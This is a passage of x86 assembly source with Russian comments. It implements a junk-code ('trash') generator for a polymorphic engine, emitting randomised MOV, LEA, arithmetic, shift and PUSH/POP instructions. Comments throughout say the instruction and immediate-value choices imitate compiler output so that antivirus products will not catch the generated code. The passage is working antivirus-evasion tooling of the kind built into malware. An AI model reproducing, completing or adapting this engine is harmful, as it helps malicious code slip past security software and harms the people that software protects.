	je		_gfr32_for_9Xh_
	add		al, 90h
	stosb																;записываем сгенерированный байт; 
	dec		ecx
	jmp		_chk_instr_ 
;=====================================[MOV/XCHG REG32, REG32]============================================



;====================================[MOV/XCHG REG8, REG8/IMM8]==========================================
;[MOV/XCHG REG8, REG8] and [MOV REG8, IMM8]
;MOV	AL, CL	etc (8Ah)
;XCHG	AL, CL	etc (86h)
;MOV	AL, 05	etc	(0BXh) 
mov_xchg___r8__r8_imm8:

OFS_MOV_8Ah			equ		02
OFS_MOV_0BXh		equ		01
OFS_XCHG_86h		equ		01
	
	cmp		ecx, 02														;аналогично; 
	jl		_chk_instr_

	push	(OFS_MOV_8Ah + OFS_MOV_0BXh + OFS_XCHG_86h) 
	call	[ebx].rang_addr

	cmp		eax, OFS_XCHG_86h
	jl		_86h_
	cmp		eax, (OFS_XCHG_86h + OFS_MOV_0BXh)
	jge		_8Ah_

_0BXh_:																	;[MOV AL, 05]
	call	get_free_r8

	add		al, 0B0h
	stosb
	
	push	255
	call	[ebx].rang_addr
	
	inc		eax															;IMM8 > 0; 
	stosb
	jmp		_mxr8r8imm8_ret_
_86h_:																	;[XCHG AL, CL]
	mov		al, 86h
	jmp		_86h_8Ah_
_8Ah_:																	;[MOV AL, CL]
	mov		al, 8Ah
_86h_8Ah_:
	stosb

_gmm114r8_1_:
	call	modrm_mod11_for_r8

	mov		edx, xm_tmp_reg1
	cmp		edx, xm_tmp_reg2
	je		_gmm114r8_1_
	stosb
_mxr8r8imm8_ret_:
	dec		ecx
	dec		ecx
	jmp		_chk_instr_
;====================================[MOV/XCHG REG8, REG8/IMM8]==========================================	
	


;==================================[MOV REG32/REG16, IMM32/IMM16]========================================
;MOV	EAX, 12345678h	etc (0B8h XXXXXXXXh)
;MOV	AX , 1234h		etc	(66h 0B8h XXXXh)  
mov___r32_r16__imm32_imm16:
	cmp		ecx, 05
	jl		_chk_instr_
	xor		edx, edx

	push	10															;вероятность генерации префикса 66h для данной команды = 1/10; 
	call	[ebx].rang_addr

	test	eax, eax
	jne		_mr32r16imm32imm16_0BXh_
_mr32r16imm32imm16_66h_:
	mov		al, 66h
	stosb
	inc		ecx
	xchg	eax, edx

_mr32r16imm32imm16_0BXh_:
	call	get_free_r32

	add		al, 0B8h
	stosb 

_mr32r16imm32imm16_grn_:
	push	-01															;генерируем СЧ в диапазоне [0x00..0xFFFFFFFF]; 
	call	[ebx].rang_addr

	cmp		eax, 81h													;imm32/imm16 > 80h (хотя можно и 80h включить), а делаем так потому что в реальном коде если imm32/imm16 < 80h, то делают push imm32/imm16 pop reg32/reg16,  
	jb		_mr32r16imm32imm16_grn_ 									;иначе могут поймать аверы; 
	stosw 
	cmp		dl, 66h
	je		_mr32r16imm32imm16_c_ecx_
	db		0Fh, 0C8h													;bswap	eax
	stosw
_mr32r16imm32imm16_c_ecx_:
	sub		ecx, 5
	jmp		_chk_instr_
;==================================[MOV REG32/REG16, IMM32/IMM16]========================================



;====================================[LEA MODRM SIB OFFSET]==============================================
;LEA	EAX, DWORD PTR [ECX + EDX]		etc	FOR ALL THIS INSTR OPCODE = 8Dh 
;LEA	ECX, DWORD PTR [EDX + EBX * 2]
;LEA	EDX, DWORD PTR [EBX + 0Ch]
;LEA	EBX, DWORD PTR [ESI + 1005h]
;etc 
lea___r32___mso:														;MODRM SIB OFFSET 
	cmp		ecx, 06														;etc 
	jl		_chk_instr_ 
	mov		al, 08Dh													;opcode
	stosb

	push	03															;далее будем строить байт modrm
	call	[ebx].rang_addr												;для начала случайно выберем режим MOD; 

	mov		esi, eax
	shl		esi, 06
	test	eax, eax													;MOD == 000b ?
	je		_lea_mod_000b_
	dec		eax															;MOD == 001b ?
	je		_lea_mod_001b_
_lea_mod_010b_:															;MOD = 010b (2)
	call	get_free_r32												;в этом режиме мы можем построить такие команды: LEA ECX, DWORD PTR [EDX + 558h] etc; offset - это 32-хбитное число; 
																		;получим свободный рег32;
	shl		eax, 03														;сдвиг влево на 3 бита;
	add		esi, eax													;добавим к mod;

	call	get_free_r32												;получим еще один свободный рег32
																		;аккуратно с выбором регов! если свободным будет например esp или ebp, тогда команда lea будет совсем другая!; 
	add		eax, esi
	stosb																;modrm 

	push	(1000h)
	call	[ebx].rang_addr

	add		eax, 101h													;и далее генерим смещение aka offset;
	stosd																;offset = [0x101..0x1000 - 0x01 + 0x101] 
	sub		ecx, 06
	jmp		_chk_instr_

_lea_mod_001b_:															;MOD = 001 (1); 
	call	get_free_r32												;в этом режиме мы можем построить такие команды: LEA ECX, DWORD PTR [EDX + 0x55] etc; offset - это 8-мибитное число; 
																		;get free reg32;
	shl		eax, 03
	add		esi, eax

	call	get_free_r32												;get free reg32

	add		eax, esi
	stosb

	push	(256 - 1)													;offset = [1..256 - 1 - 1 + 1]; 
	call	[ebx].rang_addr 

	inc		eax
	stosb
	jmp		_lea_r32mso_ret_
_lea_mod_000b_:															;MOD = 000b (0)
	call	get_free_r32												;в этом режиме мы можем построить такие команды: LEA ECX, DWORD PTR [EDX * 8 + EDI] etc; здесь вместо offset'a есть sib; 
																		;get free reg32;
	shl		eax, 03
	lea		eax, dword ptr [eax + esi + 04]								;собираем байт modrm, и в нём указываем, что после него будет идти байт sib; 
	stosb
	
	push	04															;случайно выбираем для регистра множитель: (0 - множитель 1, 1 - 2, 2 - 4, 3 - 8); 
	call	[ebx].rang_addr

	shl		eax, 06
	xchg	eax, esi

	call	get_free_r32												;get free reg32_1; or rnd_reg?

	shl		eax, 03
	add		esi, eax

	call	get_free_r32												;get free reg32_2; etc 

	add		eax, esi
	stosb
_lea_r32mso_ret_:
	sub		ecx, 03
	jmp		_chk_instr_
;====================================[LEA MODRM SIB OFFSET]==============================================



;=======================[ADC/ADD/AND/OR/SBB/SUB/XOR REG32/REG16, REG32/REG16]============================
;ADC	ECX, EDX	etc (13h)											;выбраны именно данные опкоды, так как другие опкоды для данных команд ms не генерирует; 
;ADD	EAX, ECX	etc (03h)
;AND	EAX, EBX	etc (23h)
;OR		ESI, EDI	etc (0Bh)
;SBB	EDI, ESI	etc (1Bh) 
;SUB	EBX, EAX	etc (2Bh)
;XOR	ECX, EDI	etc (33h)
;XOR	CX,  AX		etc (66h 33h) 
;etc  
adc_add_and_or_sbb_sub_xor___r32_r16__r32_r16:
;comment ! 
OFS_XOR_33h			equ		35
OFS_ADD_03h			equ		25
OFS_SUB_2Bh			equ		15
OFS_AAAOSSX_r_XXh	equ		01

	cmp		ecx, 03
	jl		_chk_instr_ 

	push	20															;будем генерировать префикс 66h с вероятностью 1/20
	call	[ebx].rang_addr
	
	test	eax, eax
	jne		_aaaosssx_r__nxt_1_ 
	mov		al, 66h
	stosb
	dec		ecx
 
_aaaosssx_r__nxt_1_:
	push	(OFS_XOR_33h + OFS_ADD_03h + OFS_SUB_2Bh + OFS_AAAOSSX_r_XXh)
	call	[ebx].rang_addr

	cmp		eax, OFS_AAAOSSX_r_XXh 
	jl		_aaaossx_r_XXh_
	cmp		eax, (OFS_AAAOSSX_r_XXh + OFS_SUB_2Bh)
	jl		_2Bh_
	cmp		eax, (OFS_AAAOSSX_r_XXh + OFS_SUB_2Bh + OFS_ADD_03h)
	jge		_33h_
_03h_:																	;[ADD REG32/REG16, REG32/REG16]
	mov		al, 03h 
	jmp		_XXh_2Bh_03h_33h_
_2Bh_:																	;[SUB REG32/REG16, REG32/REG16]
	mov		al, 2Bh														
	jmp		_XXh_2Bh_03h_33h_
_33h_:																	;[XOR REG32/REG16, REG32/REG16]
	mov		al, 33h
	jmp		_XXh_2Bh_03h_33h_ 

_aaaossx_r_XXh_:														;[все остальные доступные здесь опкоды, включая снова 03h, 2Bh, 33h]
	push	07															;далее идет алгоритм случайной генерации одного из заданных опкодов
	call	[ebx].rang_addr 
	
	shl		eax, 03
	add		al, 03 
_XXh_2Bh_03h_33h_:	
	stosb																;запишем сгенерированный опкод

_gmm114r32_2_: 
	call	modrm_mod11_for_r32											;дальше сгенерируем следующий байт (modrm) 
	 
	cmp		byte ptr [edi - 01], 33h									;смотрим, если предыдущий записанный байт = 33h (XOR), 
	jne		_aaaosssx_r__nxt_2_
	mov		edx, xm_tmp_reg1											;тогда сравним выбранные случайные свободные регистры
	cmp		edx, xm_tmp_reg2
	je		_aaaosssx_r__nxt_2_											;если же они равны, тогда смело генерим данный новый байт (модрм); 

	push	eax

	push	20															;иначе, если регистры разные, тогда запишем сгенерированный байт (с этими разными регами) с вероятностью 1/20;
	call	[ebx].rang_addr

	test	eax, eax
	pop		eax
	jne		_gmm114r32_2_												;или снова пробуем сгенерить 2-ой байт (модрм); 
_aaaosssx_r__nxt_2_:
	stosb
	dec		ecx
	dec		ecx
	jmp		_chk_instr_ 												;отправляемся на генерацию следующей инструкции/конструкции; 
		;!
;=======================[ADC/ADD/AND/OR/SBB/SUB/XOR REG32/REG16, REG32/REG16]============================



;============================[ADC/ADD/AND/OR/SBB/SUB/XOR REG8, REG8]=====================================
;ADC	CL, DL		etc (12h)											;etc 
;ADD	AL, CH		etc (02h)
;AND	AH, BH		etc (22h)
;OR		DH, DL		etc (0Ah)
;SBB	BH, CH		etc (1Ah) 
;SUB	BL, AL		etc (2Ah)
;XOR	CH, DL		etc (32h) 
;etc  
adc_add_and_or_sbb_sub_xor___r8__r8:

OFS_XOR_32h			equ		15
OFS_ADD_02h			equ		15
OFS_SUB_2Ah			equ		15
OFS_AAAOSSX_r8_XXh	equ		01

	cmp		ecx, 02
	jl		_chk_instr_ 
	
	push	(OFS_XOR_32h + OFS_ADD_02h + OFS_SUB_2Ah + OFS_AAAOSSX_r8_XXh)
	call	[ebx].rang_addr

	cmp		eax, OFS_AAAOSSX_r8_XXh 
	jl		_aaaossx_r8_XXh_
	cmp		eax, (OFS_AAAOSSX_r8_XXh + OFS_SUB_2Ah)
	jl		_2Ah_
	cmp		eax, (OFS_AAAOSSX_r8_XXh + OFS_SUB_2Ah + OFS_ADD_02h)
	jge		_32h_
_02h_:																	;[ADD REG8, REG8]
	mov		al, 02h 
	jmp		_XXh_2Ah_02h_32h_
_2Ah_:																	;[SUB REG8, REG8]
	mov		al, 2Ah														
	jmp		_XXh_2Ah_02h_32h_
_32h_:																	;[XOR REG8, REG8]
	mov		al, 32h
	jmp		_XXh_2Ah_02h_32h_ 

_aaaossx_r8_XXh_:														;[все остальные доступные здесь опкоды, включая снова 03h, 2Bh, 33h]
	push	07															;далее идет алгоритм случайной генерации одного из заданных опкодов
	call	[ebx].rang_addr 

	shl		eax, 03
	add		al, 02
_XXh_2Ah_02h_32h_:	
	stosb																;запишем сгенерированный опкод

_gmm114r8_2_: 
	call	modrm_mod11_for_r8											;дальше сгенерируем следующий байт (modrm) 
	 
	cmp		byte ptr [edi - 01], 32h									;смотрим, если предыдущий записанный байт = 33h (XOR), 
	jne		_aaaosssx_r8__nxt_2_
	mov		edx, xm_tmp_reg1											;тогда сравним выбранные случайные свободные регистры
	cmp		edx, xm_tmp_reg2
	je		_aaaosssx_r8__nxt_2_										;если же они равны, тогда смело генерим данный новый байт (модрм); 

	push	eax

	push	20															;иначе, если регистры разные, тогда запишем сгенерированный байт (с этими разными регами) с вероятностью 1/20;
	call	[ebx].rang_addr

	test	eax, eax
	pop		eax
	jne		_gmm114r8_2_												;или снова пробуем сгенерить 2-ой байт (модрм); 
_aaaosssx_r8__nxt_2_:
	stosb
	dec		ecx
	dec		ecx
	jmp		_chk_instr_ 												;отправляемся на генерацию следующей инструкции/конструкции; 
;============================[ADC/ADD/AND/OR/SBB/SUB/XOR REG8, REG8]=====================================


   
;===========================[ADC/ADD/AND/OR/SBB/SUB/XOR REG32, IMM32]====================================
;[ADC/ADD/AND/OR/SBB/SUB/XOR REG32, IMM32] -> REG32 != EAX
;ADC	ECX, 12345678h	etc	(81h 0DXh)
;ADD	EDX, 87654321h	etc (81h 0CXh)
;AND	EBX, 21436587h	etc (81h 0EXh)
;OR		ESI, 78563412h	etc (81h 0CXh)
;SBB	EDI, 13572468h	etc (81h 0DXh)
;SUB	ECX, 56123487h	etc (81h 0EXh)
;XOR	EDX, 78461235h	etc (81h 0FXh)
adc_add_and_or_sbb_sub_xor___r32__imm32: 

OFS_ADD_81CXh			equ		35
OFS_SUB_81EXh			equ		25
OFS_AND_81EXh			equ		15
OFS_AAAOSSX_r_imm_XXh	equ		01
OFS_AAAOSSX_EAX_IMM_XXh	equ		15

	cmp		ecx, 06														;если кол-во оставшихся байт для генерации трэша меньше 6, тогда на выход!
	jl		_chk_instr_

	push	(OFS_ADD_81CXh + OFS_SUB_81EXh + OFS_AND_81EXh + OFS_AAAOSSX_r_imm_XXh + OFS_AAAOSSX_EAX_IMM_XXh) 
	call	[ebx].rang_addr
	
	cmp		eax, OFS_AAAOSSX_EAX_IMM_XXh
	jl		adc_add_and_or_sbb_sub_xor___eax__imm32 
	mov		byte ptr [edi], 81h											;записываем вначале опкод 
	inc		edi
	cmp		eax, (OFS_AAAOSSX_EAX_IMM_XXh + OFS_AAAOSSX_r_imm_XXh)
	jl		_aaaossx_r_imm_XXh_
	cmp		eax, (OFS_AAAOSSX_EAX_IMM_XXh + OFS_AAAOSSX_r_imm_XXh + OFS_AND_81EXh)
	jl		_and_81EXh_
	cmp		eax, (OFS_AAAOSSX_EAX_IMM_XXh + OFS_AAAOSSX_r_imm_XXh + OFS_AND_81EXh + OFS_SUB_81EXh)
	jge		_add_81CXh_
_sub_81EXh_:															;[SUB REG32, IMM32]
	mov		al, 0E8h													;данной инструкции соотв-ет байт MODRM [0xE8..0xEF]
	jmp		_aaaossx_r_imm_nxt_1_
_add_81CXh_:															;[ADD REG32, IMM32]
	mov		al, 0C0h
	jmp		_aaaossx_r_imm_nxt_1_
_and_81EXh_:															;[AND REG32, IMM32]
	mov		al, 0E0h 
	jmp		_aaaossx_r_imm_nxt_1_		

_aaaossx_r_imm_XXh_:													;здесь будут генериться все остальные (включая и предыдущие) доступные команды (байты); 
	push	07															;без генерации CMP...; 
	call	[ebx].rang_addr

	shl		eax, 03
	add		al, 0C0h													;[0xC0..0xF7]
_aaaossx_r_imm_nxt_1_:	
	xchg	eax, edx
	
	;mov	xm_tmp_reg0, XM_EAX											;можно либо залочить регистр
	;call	set_r32

_aaaossx_r_imm_gfr32_:
	call	get_free_r32												;получаем случайный свободный рег
	
	test	eax, eax													;можно либо залочить регистр, либо сделать такую проверку
	je		_aaaossx_r_imm_gfr32_										;если выбран рег EAX, то снова выбираем другой рег (так как данные команды с регом EAX имеют другие опкоды - мы строим правильные инструкции!); 

	add		eax, edx													;складываем полученный регистр (рег)
	stosb																;записываем новый сгенерированный байтек; 

_aaaossx_r_imm_grn_:
	push	-01															;генерим СЧ в диапазоне [0x101..0xFFFFFFFF] 
	call	[ebx].rang_addr

	cmp		eax, 101h													;imm32 > 100h, иначе если у нас будет imm < 100h, тогда могут поймать авэхи, так как в таком случае можно записать 
	jb		_aaaossx_r_imm_grn_ 										;укороченную версию команд (83h...); 

	stosd																;запишем сгенерированное СЧ; 

	;call	unset_r32

	sub		ecx, 06														;скорректируем кол-во оставшихся байт для записи мусора; 
	jmp		_chk_instr_													;переходим на запись других команд; 

;========================================================================================================
;[ADC/ADD/AND/OR/SBB/SUB/XOR EAX, IMM32]
;ADC	EAX, 12345678h	etc (15h)
;ADD	EAX, 87654321h	etc (05h)
;AND	EAX, 21436587h	etc (25h)
;OR		EAX, 78563412h	etc (0Dh)
;SBB	EAX, 13572468h	etc (1Dh)
;SUB	EAX, 24681357h	etc (2Dh)
;XOR	EAX, 75318642h	etc (35h)
adc_add_and_or_sbb_sub_xor___eax__imm32:

OFS_ADD_EAX_05h			equ		35
OFS_SUB_EAX_2Dh			equ		25
OFS_AND_EAX_25h			equ		15
OFS_AAAOSSX_EAX_XXh		equ		01

	cmp		ecx, 05														;если кол-во оставшихся байт для генерации мусора меньше 5, то выходим 
	jl		_chk_instr_

	mov		xm_tmp_reg0, XM_EAX											;указываем, что нужно проверить, свободен ли регистр EAX
	call	is_free_r32													;вызываем функу провеки;
	
	inc		eax															;если EAX = -01, значит регистр занят, и а таком случае выходим из данной конструкции; 
	je		_chk_instr_
	;dec		eax

	push	(OFS_ADD_EAX_05h + OFS_SUB_EAX_2Dh + OFS_AND_EAX_25h + OFS_AAAOSSX_EAX_XXh)
	call	[ebx].rang_addr

	cmp		eax, OFS_AAAOSSX_EAX_XXh
	jl		_aaaossx_eax_XXh_
	cmp		eax, (OFS_AAAOSSX_EAX_XXh + OFS_AND_EAX_25h)
	jl		_and_eax_25h_
	cmp		eax, (OFS_AAAOSSX_EAX_XXh + OFS_AND_EAX_25h + OFS_SUB_EAX_2Dh)
	jge		_add_eax_05h_
_sub_eax_2Dh_: 															;[SUB EAX, IMM32]
	mov		al, 2Dh
	jmp		_aaaossx_eax_XXh_nxt_1_
_add_eax_05h_:															;[ADD EAX, IMM32]
	mov		al, 05h
	jmp		_aaaossx_eax_XXh_nxt_1_
_and_eax_25h_:															;[AND EAX, IMM32]
	mov		al, 25h
	jmp		_aaaossx_eax_XXh_nxt_1_

_aaaossx_eax_XXh_:														;генерация всех остальных доступных команд, включая и предыдущие;
	push	07
	call	[ebx].rang_addr

	shl		eax, 03h
	add		al, 05h 
_aaaossx_eax_XXh_nxt_1_:
	stosb

_aaaossx_eax_XXh_grn_:													;генерируем СЧ в [0x101..0xFFFFFFFF]; 
	push	-01
	call	[ebx].rang_addr

	cmp		eax, 101h													;etc
	jb		_aaaossx_eax_XXh_grn_ 
	stosd																;запишем СЧ;
	sub		ecx, 05 													;скорректируем
	jmp		_chk_instr_ 												;переходим к генерации других инструкций/конструкций; 
;===========================[ADC/ADD/AND/OR/SBB/SUB/XOR REG32, IMM32]====================================



;===========================[ADC/ADD/AND/OR/SBB/SUB/XOR REG32, IMM8]=====================================
;ADC	EAX, 55h	etc	(83h 0DXh)
;ADD	ECX, 35h	etc	(83h 0CXh)
;AND	EDX, 7Fh	etc	(83h 0EXh)
;OR		EBX, 51h	etc	(83h 0CXh)
;SBB	ESI, 35h	etc	(83h 0DXh)
;SUB	EDI, 03h	etc	(83h 0EXh)
;XOR	EAX, 09h	etc	(83h 0FXh)  
adc_add_and_or_sbb_sub_xor___r32__imm8:

OFS_ADD_83CXh			equ		35										;тут можно либо делать суммарное значение, что в таблице статы, либо индивидуальные настройки; 
OFS_SUB_83EXh			equ		25
OFS_AND_83EXh			equ		15
OFS_AAAOSSX_r_imm8_XXh	equ		01 
	
	cmp		ecx, 03														;если кол-во оставшихся для записи мусора байт меньше 3, то на выход 
	jl		_chk_instr_

	mov		al, 83h														;запишем сначала опкод (1-ый байт)
	stosb

	push	(OFS_ADD_83CXh + OFS_SUB_83EXh + OFS_AND_83EXh + OFS_AAAOSSX_r_imm8_XXh)
	call	[ebx].rang_addr

	cmp		eax, OFS_AAAOSSX_r_imm8_XXh
	jl		_aaaossx_r_imm8_XXh_
	cmp		eax, (OFS_AAAOSSX_r_imm8_XXh + OFS_AND_83EXh)
	jl		_and_83EXh_
	cmp		eax, (OFS_AAAOSSX_r_imm8_XXh + OFS_AND_83EXh + OFS_SUB_83EXh)
	jge		_add_83CXh_
_sub_83EXh_:															;[SUB REG32, IMM8]
	mov		al,0E8h 
	jmp		_aaaossx_r_imm8_XXh_nxt_1_
_add_83CXh_:															;[ADD REG32, IMM8]
	mov		al,0C0h 
	jmp		_aaaossx_r_imm8_XXh_nxt_1_
_and_83EXh_:															;[AND REG32, IMM8]
	mov		al,0E0h 
	jmp		_aaaossx_r_imm8_XXh_nxt_1_ 

_aaaossx_r_imm8_XXh_:													;[все остальные команды, включая и предыдущие (SUB/ADD/AND)] 
	push	07
	call	[ebx].rang_addr

	shl		eax, 03														; 
	add		al, 0C0h
_aaaossx_r_imm8_XXh_nxt_1_:
	xchg	eax, edx

	call	get_free_r32												;получаем случайный свободный регистр

	add		eax, edx
	stosb																;записываем следующий (2-ой) байтек

	push	(256 - 3)													;получим СЧ в диапазоне [0x03..0xFF]
	call	[ebx].rang_addr

	add		eax, 03														;imm8 > 02; 
	stosb																;записываем следующий (3-ий) байт; 
	sub		ecx, 03
	jmp		_chk_instr_ 
;===========================[ADC/ADD/AND/OR/SBB/SUB/XOR REG32, IMM8]=====================================



;===========================[ADC/ADD/AND/OR/SBB/SUB/XOR REG8, IMM8]====================================== 
;[ADC/ADD/AND/OR/SBB/SUB/XOR REG8, IMM8] -> REG8 != AL
;ADC	CL, 005h	etc (80h 0DXh)
;ADD	DL, 0F8h	etc	(80h 0CXh)
;AND	BL, 78h		etc	(80h 0EXh)
;OR		AH, 35h		etc	(80h 0CXh)
;SBB	CH, 14h		etc	(80h 0DXh)
;SUB	DH, 0FFh	etc	(80h 0EXh)
;XOR	BH, 0EFh	etc	(80h 0FXh)
adc_add_and_or_sbb_sub_xor___r8__imm8:

OFS_ADD_80CXh				equ		35
OFS_SUB_80EXh				equ		25
OFS_AND_80EXh				equ		15
OFS_AAAOSSX_r8_imm8_XXh		equ		01
OFS_AAAOSSX_AL_IMM8_XXh		equ		15

	cmp		ecx, 03
	jl		_chk_instr_ 

	push	(OFS_ADD_80CXh + OFS_SUB_80EXh + OFS_AND_80EXh + OFS_AAAOSSX_r8_imm8_XXh + OFS_AAAOSSX_AL_IMM8_XXh) 
	call	[ebx].rang_addr
	
	cmp		eax, OFS_AAAOSSX_AL_IMM8_XXh
	jl		adc_add_and_or_sbb_sub_xor___al__imm8
	mov		byte ptr [edi], 80h											;сначала запишем опкод
	inc		edi 
	cmp		eax, (OFS_AAAOSSX_AL_IMM8_XXh + OFS_AAAOSSX_r8_imm8_XXh)
	jl		_aaaossx_r8_imm8_XXh_
	cmp		eax, (OFS_AAAOSSX_AL_IMM8_XXh + OFS_AAAOSSX_r8_imm8_XXh + OFS_AND_80EXh)
	jl		_and_80EXh_
	cmp		eax, (OFS_AAAOSSX_AL_IMM8_XXh + OFS_AAAOSSX_r8_imm8_XXh + OFS_AND_80EXh + OFS_SUB_80EXh)
	jge		_add_80CXh_ 
_sub_80EXh_:
	mov		al, 0E8h													;[SUB REG8, IMM8]
	jmp		_aaaossx_r8_imm8_XXh_nxt_1_
_add_80CXh_:															;[ADD REG8, IMM8]
	mov		al, 0C0h
	jmp		_aaaossx_r8_imm8_XXh_nxt_1_
_and_80EXh_:															;[AND REG8, IMM8]
	mov		al, 0E0h
	jmp		_aaaossx_r8_imm8_XXh_nxt_1_

_aaaossx_r8_imm8_XXh_:													;[все остальные команды, включая и эти SUB/ADD/AND]
	push	07
	call	[ebx].rang_addr

	shl		eax, 03
	add		al, 0C0h
_aaaossx_r8_imm8_XXh_nxt_1_:
	xchg	eax, edx

_aaaossx_r8_imm8_XXh_gfr8_: 
	call	get_free_r8													;получаем свободный случайный 8-миразрядный регистр; 

	test	eax, eax													;если выпал AL, тогда снова выбираем другой случайный регистр; 
	je		_aaaossx_r8_imm8_XXh_gfr8_ 

	add		eax, edx
	stosb																;записываем следующий байт

_aaaossx_r8_imm8_XXh_grn_:
	push	-01															;выбираем СЧ в диапазоне [0x03..0xFF]; 
	call	[ebx].rang_addr

	cmp		al, 03														;imm8 > 02; 
	jb		_aaaossx_r8_imm8_XXh_grn_
	stosb																;записываем еще один байтек; 
	sub		ecx, 03
	jmp		_chk_instr_ 

;========================================================================================================
;[ADC/ADD/AND/OR/SBB/SUB/XOR AL, IMM8]
;ADC	AL, 12h		etc	(14h)
;ADD	AL, 34h		etc	(04h)
;AND	AL, 0FFh	etc	(24h)
;OR		AL, 0F1h	etc	(0Ch)
;SBB	AL, 98h		etc	(1Ch)
;SUB	AL, 61h		etc	(2Ch)
;XOR	AL, 57h		etc	(34h) 
adc_add_and_or_sbb_sub_xor___al__imm8:

OFS_ADD_AL_04h			equ		35
OFS_SUB_AL_2Ch			equ		25
OFS_AND_AL_24h			equ		15
OFS_AAAOSSX_AL_XXh		equ		01

	cmp		ecx, 02
	jl		_chk_instr_

	mov		xm_tmp_reg0, XM_EAX											;указываем, что нужно проверить, свободен ли регистр EAX (AL, но не AH!); 
	call	is_free_r32													;вызываем функу провеки;
	
	inc		eax															;если EAX = -01, значит регистр занят, и а таком случае выходим из данной конструкции; 
	je		_chk_instr_

	push	(OFS_ADD_AL_04h + OFS_SUB_AL_2Ch + OFS_AND_AL_24h + OFS_AAAOSSX_AL_XXh)
	call	[ebx].rang_addr

	cmp		eax, OFS_AAAOSSX_AL_XXh
	jl		_aaaossx_al_XXh_
	cmp		eax, (OFS_AAAOSSX_AL_XXh + OFS_AND_AL_24h)
	jl		_and_al_24h_
	cmp		eax, (OFS_AAAOSSX_AL_XXh + OFS_AND_AL_24h + OFS_SUB_AL_2Ch)
	jge		_add_al_04h_
_sub_al_2Ch_:															;[SUB AL, IMM8]
	mov		al, 2Ch
	jmp		_aaaossx_al_XXh_nxt_1_
_add_al_04h_:															;[ADD AL, IMM8]
	mov		al, 04h
	jmp		_aaaossx_al_XXh_nxt_1_
_and_al_24h_:															;[AND AL, IMM8]
	mov		al, 24h
	jmp		_aaaossx_al_XXh_nxt_1_
	              
_aaaossx_al_XXh_:														;etc 
	push	07
	call	[ebx].rang_addr

	shl		eax, 03
	add		al, 04
_aaaossx_al_XXh_nxt_1_:
	stosb																;write 1-st byte

_aaaossx_al_XXh_grn_:
	push	-01
	call	[ebx].rang_addr

	cmp		al, 03														;imm8 > 02; 
	jb		_aaaossx_al_XXh_grn_
	stosb																;write 2-nd byte; 
	dec		ecx
	dec		ecx
	jmp		_chk_instr_ 
;===========================[ADC/ADD/AND/OR/SBB/SUB/XOR REG8, IMM8]======================================
 


;============================[RCL/RCR/ROL/ROR/SHL/SHR REG32, IMM8]=======================================
;RCL	EAX, 02h	etc	(0C1h 0DXh)
;RCR	ECX, 12h	etc	(0C1h 0DXh)
;ROL	EDX, 1Fh	etc	(0C1h 0CXh)
;ROR	EBX, 09h	etc	(0C1h 0CXh) 
;SHL	ESI, 05h	etc	(0C1h 0EXh)
;SHR	EDI, 15h	etc	(0C1h 0EXh)
;RCL	EAX, 01h	etc	(0D1h 0DXh) 
;etc 
rcl_rcr_rol_ror_shl_shr___r32__imm8:

OFS_RRRRSS_0C1h			equ		05
OFS_RRRRSS_0D1h			equ		01

OFS_SHL_SHR_r32_imm8	equ		35
OFS_RRRRSS_XXh			equ		15

	cmp		ecx, 03
	jl		_chk_instr_
	;xor		edx, edx 

	push	(OFS_RRRRSS_0C1h + OFS_RRRRSS_0D1h) 						;сначала выберем, какой опкод сгенерировать
	call	[ebx].rang_addr

	cmp		eax, OFS_RRRRSS_0D1h
	jl		_rrrrss_0D1h_
_rrrrss_0C1h_:															;[SHL/etc REG32, IMM8] -> IMM8 != 1; 
	mov		al, 0C1h
	jmp		_rrrrss_0C1h_0D1h_ 
_rrrrss_0D1h_:															;[SHL/etc REG32, 1]
	mov		al, 0D1h
_rrrrss_0C1h_0D1h_:
	stosb
	xchg	eax, edx

	push	(OFS_SHL_SHR_r32_imm8 + OFS_RRRRSS_XXh)						;теперь выберем, какую команду будем генерировать
	call	[ebx].rang_addr 

	cmp		eax, OFS_RRRRSS_XXh
	jl		_rrrrss_XXh_

_shl_shr_r32_imm8_:														;[SHL/SHR REG32, IMM8]
	push	02
	call	[ebx].rang_addr
	
	shl		eax, 03
	add		al, 0E0h
	jmp		_rrrrss_r32_imm8_nxt_1_

_rrrrss_XXh_:															;[все остальные инструкции, включая также SHL/SHR] 
	push	06															;если нужно еще генерить SAL/SAR, тогда вместо 06 пишем 08; 
	call	[ebx].rang_addr

	shl		eax, 03
	add		al, 0C0h
_rrrrss_r32_imm8_nxt_1_: 
	xchg	eax, esi

	call	get_free_r32												;получаем случайный свободный регистр

	add		eax, esi
	stosb

	cmp		dl, 0D1h													;если была сгенерированана команда [SHL/etc REG32, 1] 
	je		_rrrrss_r32_imm8_nxt_2_										;тогда на выход

	push	30															;иначе сгенерируем IMM8 - это 1-байтовое число в диапазоне [2..31]; 
	call	[ebx].rang_addr

	inc		eax
	inc		eax
	stosb
	dec		ecx
_rrrrss_r32_imm8_nxt_2_: 
	dec		ecx
	dec		ecx	
	jmp		_chk_instr_													;переходим к генерации следующих инструкций/команд/конструкций; 
;============================[RCL/RCR/ROL/ROR/SHL/SHR REG32, IMM8]=======================================
 


;================================[PUSH REG32/IMM8   POP REG32]===========================================

;========================================[PUSH REG32]====================================================
;PUSH	EAX	etc	(50h)
push_pop___r32___r32:
	push	50h															;если изменить данное значение, тогда его также нужно изменить и в таблице размеров и стастики команд (опкодов); 
	call	[ebx].rang_addr

	add		eax, 03														;тут также, так как 50 (max кол-во байт между push и pop) + 3 (описание на следующей строке) + 2 (размер push (1) и pop (1) = 1 + 1 = 2 bytes); 
	mov		edx, eax													;3 байта - тут такая тема: если сгенерируется push eax ... pop eax (реги одинаковые), то чтобы всё было правдоподобно, нужно значение рега eax как-то использовать, 
																		;например, так: push eax inc eax mov ecx,eax pop eax - тогда это не будет мусором. Между push и pop как раз 3 байта минимум получается; 
	inc		eax															;дальше eax += 2 - это размер push reg32 и pop reg32; 
	inc		eax
	cmp		ecx, eax
	jl		_chk_instr_

	call	get_num_free_r32											;получаем кол-во свободных регов на данный момент; 

	cmp		eax, (03 + 01)												;если их >= 4, тогда всё отлично! 
	jl		_chk_instr_													;(3 - для корректной работы трэшгена (хотя не обязательно), и +1 - для данной конструкции); 

	call	get_free_r32
	
	add		al, 50h														;[PUSH REG32]
	stosb
	dec		ecx															;корректируем кол-во оставшихся байт (для записи трэша); 
	jmp		pop___r32													;esi - содержит регистр, а edx - число - кол-во байт между push & pop; переходим на генерацию [POP REG32]
;========================================[PUSH REG32]====================================================



;========================================[PUSH IMM8]=====================================================
;PUSH	55h	etc	(6Ah XXh); 
push_pop___imm8___r32:
	push	0Ah
